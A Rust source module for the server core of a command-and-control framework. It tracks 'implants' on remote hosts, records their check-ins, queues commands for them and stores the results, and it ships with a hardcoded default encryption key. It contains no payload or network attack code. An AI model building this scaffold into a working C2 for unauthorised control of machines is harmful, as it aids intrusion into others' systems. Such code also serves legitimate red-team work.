// C2 Core Module - Command and Control functionality

use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use chrono::{DateTime, Utc};

mod iso8601 {
    use serde::{self, Deserialize, Serializer, Deserializer};
    use chrono::{DateTime, Utc};
    
    pub fn serialize<S>(date: &DateTime<Utc>, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        let s = date.to_rfc3339();
        serializer.serialize_str(&s)
    }
    
    pub fn deserialize<'de, D>(deserializer: D) -> Result<DateTime<Utc>, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        DateTime::parse_from_rfc3339(&s)
            .map(|dt| dt.with_timezone(&Utc))
            .map_err(serde::de::Error::custom)
    }
    
    pub fn serialize_option<S>(date: &Option<DateTime<Utc>>, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        match date {
            Some(d) => serialize(d, serializer),
            None => serializer.serialize_none(),
        }
    }
    
    pub fn deserialize_option<'de, D>(deserializer: D) -> Result<Option<DateTime<Utc>>, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s = Option::<String>::deserialize(deserializer)?;
        match s {
            Some(s) => DateTime::parse_from_rfc3339(&s)
                .map(|dt| dt.with_timezone(&Utc))
                .map(Some)
                .map_err(serde::de::Error::custom),
            None => Ok(None),
        }
    }
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct C2Config {
    pub server_address: String,
    pub port: u16,
    pub use_https: bool,
    pub encryption_key: String,
    pub ssl_cert_path: Option<String>,
    pub ssl_key_path: Option<String>,
}

impl Default for C2Config {
    fn default() -> Self {
        Self {
            server_address: "0.0.0.0".to_string(),
            port: 8443,
            use_https: true,
            encryption_key: "default-encryption-key-12345".to_string(),
            ssl_cert_path: None,
            ssl_key_path: None,
        }
    }
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Implant {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub ip_address: String,
    pub platform: String,
    #[serde(with = "iso8601")]
    pub last_checkin: DateTime<Utc>,
    pub status: ImplantStatus,
    pub tasks: Vec<Task>,
}

#[derive(Debug, Serialize, Deserialize, Clone, PartialEq, Default)]
pub enum ImplantStatus {
    Active,
    Inactive,
    Compromised,
    #[default]
    Unknown,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Task {
    pub id: String,
    pub command: String,
    pub status: TaskStatus,
    pub result: Option<String>,
    #[serde(with = "iso8601")]
    pub created_at: DateTime<Utc>,
    #[serde(
        serialize_with = "iso8601::serialize_option",
        deserialize_with = "iso8601::deserialize_option",
        skip_serializing_if = "Option::is_none"
    )]
    pub completed_at: Option<DateTime<Utc>>,
}

#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
pub enum TaskStatus {
    Pending,
    InProgress,
    Completed,
    Failed,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct C2Message {
    pub message_type: MessageType,
    pub implant_id: String,
    pub payload: String,
    #[serde(with = "iso8601")]
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Serialize, Deserialize, Clone, PartialEq)]
pub enum MessageType {
    Register,
    CheckIn,
    TaskRequest,
    TaskResponse,
    Error,
}

#[derive(Debug, Default)]
pub struct C2Server {
    pub config: C2Config,
    pub implants: Arc<Mutex<Vec<Implant>>>,
    pub tasks: Arc<Mutex<Vec<Task>>>,
}

impl C2Server {
    pub fn new(config: C2Config) -> Self {
        Self {
            config,
            implants: Arc::new(Mutex::new(Vec::new())),
            tasks: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn add_implant(&self, implant: Implant) {
        let mut implants = self.implants.lock().unwrap();
        // Check if implant already exists
        if !implants.iter().any(|i| i.id == implant.id) {
            implants.push(implant);
        }
    }

    pub fn update_implant(&self, implant_id: &str, update_fn: impl FnOnce(&mut Implant)) -> bool {
        let mut implants = self.implants.lock().unwrap();
        if let Some(implant) = implants.iter_mut().find(|i| i.id == implant_id) {
            update_fn(implant);
            return true;
        }
        false
    }

    pub fn get_implant(&self, implant_id: &str) -> Option<Implant> {
        let implants = self.implants.lock().unwrap();
        implants.iter().find(|i| i.id == implant_id).cloned()
    }

    pub fn get_implants(&self) -> Vec<Implant> {
        let implants = self.implants.lock().unwrap();
        implants.clone()
    }

    pub fn add_task(&self, implant_id: &str, command: &str) -> Option<Task> {
        let task_id = format!("task-{}", uuid::Uuid::new_v4());
        let new_task = Task {
            id: task_id.clone(),
            command: command.to_string(),
            status: TaskStatus::Pending,
            result: None,
            created_at: Utc::now(),
            completed_at: None,
        };

        // Add to global tasks
        let mut tasks = self.tasks.lock().unwrap();
        tasks.push(new_task.clone());

        // Add to specific implant if exists
        {
            let mut implants = self.implants.lock().unwrap();
            if let Some(implant) = implants.iter_mut().find(|i| i.id == implant_id) {
                implant.tasks.push(new_task.clone());
                return Some(new_task);
            }
        }

        None
    }

    pub fn update_task(&self, task_id: &str, status: TaskStatus, result: Option<String>) -> bool {
        let mut tasks = self.tasks.lock().unwrap();
        if let Some(task) = tasks.iter_mut().find(|t| t.id == task_id) {
            task.status = status;
            task.result = result;
            task.completed_at = Some(Utc::now());
            return true;
        }
        false
    }

    pub fn get_pending_tasks(&self, implant_id: &str) -> Vec<Task> {
        if let Some(implant) = self.get_implant(implant_id) {
            return implant.tasks
                .into_iter()
                .filter(|t| matches!(t.status, TaskStatus::Pending))
                .collect();
        }
        Vec::new()
    }

    pub fn register_implant(&self, implant: Implant) {
        let implant_id = implant.id.clone();
        self.add_implant(implant);
        log::info!("New implant registered: {}", implant_id);
    }

    pub fn implant_checkin(&self, implant_id: &str) -> bool {
        self.update_implant(implant_id, |implant| {
            implant.last_checkin = Utc::now();
            implant.status = ImplantStatus::Active;
        })
    }
}